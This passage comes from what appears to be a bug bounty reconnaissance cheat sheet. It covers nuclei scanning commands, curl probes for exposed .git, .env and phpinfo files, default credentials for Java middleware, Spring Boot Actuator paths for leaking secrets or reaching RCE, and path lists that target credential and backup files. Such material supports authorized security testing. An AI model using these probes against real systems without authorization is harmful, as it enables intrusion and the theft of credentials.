- Each parameter tells a story: "what does this do server-side?"
- Filename → OS interaction → Path Traversal / CMDi
- URL/location → HTTP fetch → SSRF
- Template/HTML parameter → render function → SSTI
- XML field → parser → XXE
- SQL filter → query → SQLi
- User-content → storage → Stored XSS
```

---

## 8. BUG BOUNTY PROGRAM TRIAGE (WHERE TO SPEND TIME)

### High-Value Target Selection
```
✓ Programs with large scope (*.target.com)
✓ Programs that pay for P2/P3 (not just RCE)
✓ Programs with recent tech changes (migrations = new bugs)
✓ Programs with active development (new features = new attack surface)
× Avoid: frozen/old codebases with well-known CVEs (already claimed)
× Avoid: strict programs with narrow scope (less surface)
```

### High-Value Feature Focus (by bug probability)
```
Priority 1: Authentication, password reset, 2FA → account takeover
Priority 2: File upload, profile edit, API endpoints → stored XSS, IDOR
Priority 3: Admin panels, user management → BFLA, privilege escalation
Priority 4: Payment flows, subscription → business logic
Priority 5: Import/export, template rendering → XXE, SSTI
```

---

## 9. NUCLEI TEMPLATES (AUTOMATED SCANNING)

```bash
# Run all on target:
nuclei -u https://target.com -t /nuclei-templates/ -o nuclei-results.txt

# Specific categories:
nuclei -u https://target.com -t cves/ -severity critical,high
nuclei -u https://target.com -t exposures/
nuclei -u https://target.com -t misconfiguration/

# On subdomain list:
cat subdomains.txt | nuclei -t exposures/ -t misconfiguration/ -o exposed.txt
```

---

## 10. COMMON MISCONFIGURATIONS (QUICK WINS)

```
□ CORS: Access-Control-Allow-Origin: * with credentials → CSRF + data theft
□ S3 bucket public: curl https://target.s3.amazonaws.com/
□ Directory listing: response contains "Index of /"
□ .git exposed: curl https://target.com/.git/config
□ .env exposed: curl https://target.com/.env
□ Debug mode: stack traces in production (source code exposure)
□ Default credentials: admin:admin, admin:password on admin panels
□ phpinfo.php: curl https://target.com/phpinfo.php
□ Backup files: config.bak, database.sql.gz, app.zip
□ GraphQL introspection enabled: POST /graphql {"query":"{__schema{types{name}}}"}
□ Admin panels: /admin /manager /console /phpmyadmin /wp-admin
```

---

## 11. QUICK REFERENCE TOOLS

| Category | Tool |
|---|---|
| Subdomain enum | subfinder, amass, massdns |
| Port scan | nmap, masscan |
| HTTP probe | httpx |
| Dir brute | ffuf, feroxbuster, gobuster |
| JS mining | LinkFinder, gau, waybackurls |
| Secret scan | trufflehog, gitleaks |
| Parameter fuzz | arjun, x8 |
| Vuln scan | nuclei |
| Proxy/intercept | Burp Suite Pro |
| JWT attacks | jwt_tool |
| SQLi | sqlmap |
| XSS | dalfox, XSStrike |
| SSRF | SSRFmap, Gopherus |

---

## 12. JAVA MIDDLEWARE FINGERPRINT MATRIX

| Middleware | Detection Path | Key Indicators |
|---|---|---|
| Apache Tomcat | `/manager/html`, `/manager/status` | Default creds: `tomcat:tomcat`, `admin:admin` |
| JBoss / WildFly | `/jmx-console/`, `/web-console/` | JMX MBean access, WAR deployment |
| WebLogic | `/console/`, `/wls-wsat/` | T3 protocol on 7001/7002, IIOP |
| Spring Boot Actuator | `/actuator/`, `/actuator/env`, `/actuator/heapdump` | JSON endpoint listing, heap dump contains secrets |
| Spring Boot (alt paths) | `/actuator/jolokia`, `/actuator/gateway/routes` | Jolokia JMX bridge, Gateway route injection |
| Jenkins | `/script`, `/manage` | Groovy console, API token in cookie |
| GlassFish | `/common/`, `/theme/` | Admin on 4848, default empty password |
| Jetty | `/jolokia/` | JMX access |
| Resin | `/resin-admin/` | Admin panel |

### Spring Boot Actuator Exploitation Priority

```
/actuator/env          → Leak environment variables (DB creds, API keys)
/actuator/heapdump     → Download JVM heap → search for passwords in memory
/actuator/jolokia      → JMX → possible RCE via MBean manipulation
/actuator/gateway/routes → Spring Cloud Gateway → SpEL injection (CVE-2022-22947)
/actuator/configprops  → All configuration properties
/actuator/mappings     → All URL mappings (hidden endpoints)
/actuator/beans        → All Spring beans
/actuator/threaddump   → Thread dump (may leak session tokens / secrets in stack frames)
```

---

## 13. INFORMATION LEAK DETECTION CHECKLIST

### Version Control & Backup Leaks

```
/.git/HEAD                    → Git repository exposed
/.svn/entries                 → SVN metadata
/.svn/wc.db                   → SVN SQLite database
/.hg/requires                 → Mercurial
/.bzr/README                  → Bazaar
/.DS_Store                    → macOS directory listing
```

### Backup File Patterns

```
/backup.zip    /backup.tar.gz    /backup.sql
/wwwroot.rar   /www.zip          /web.zip
/db.sql        /database.sql     /dump.sql
/config.php.bak    /config.php~    /config.php.swp
/.config.php.swp   /wp-config.php.bak
/.env          /.env.bak         /.env.production
```

### API Documentation & Debug

```
/swagger-ui.html              → Swagger/OpenAPI
/swagger-ui/                  → Swagger UI
/api-docs                     → API documentation
/graphql                      → GraphQL playground
/graphiql                     → GraphQL IDE
/debug/                       → Debug endpoints
/phpinfo.php                  → PHP configuration
/server-status                → Apache status
/server-info                  → Apache info
/nginx_status                 → Nginx status
```

### Cloud & Infrastructure

```
/.aws/credentials             → AWS credentials
/.docker/config.json          → Docker registry auth
/robots.txt                   → Disallowed paths (hint list)
/sitemap.xml                  → Full URL listing
/crossdomain.xml              → Flash cross-domain policy
/.well-known/                 → Various well-known URIs
```

## Quelle: hack-skills — recon-for-sec (31 Zeilen)

# Recon and Methodology Router

This is the starting router for new targets and unknown attack surfaces.

## When to Use

- You just received a new target and do not yet know what to test first
- You need to begin by drawing the surface from the application, then asset discovery, fingerprinting, and test-route planning
- You want to build follow-up testing on structured methodology instead of random payload enumeration

## Skill Map

- [Attack Surface Mapping](../attack-surface-mapping/SKILL.md) — from one URL / one app, draw hosts, APIs, keys, and the object graph
- [Recon and Methodology](../recon-and-methodology/SKILL.md)
- [Insecure Source Code Management](../insecure-source-code-management/SKILL.md) — .git/.svn/.hg exposure detection
- [Dependency Confusion](../dependency-confusion/SKILL.md) — Supply chain reconnaissance for internal package names

## Recommended Flow

1. Confirm in-scope assets and target type
2. Draw the surface from the application: [attack-surface-mapping](../attack-surface-mapping/SKILL.md)
3. Route the inventory to [api-sec](../api-sec/SKILL.md), [auth-sec](../auth-sec/SKILL.md), [injection-checking](../injection-checking/SKILL.md), or [business-logic-vuln](../business-logic-vuln/SKILL.md)
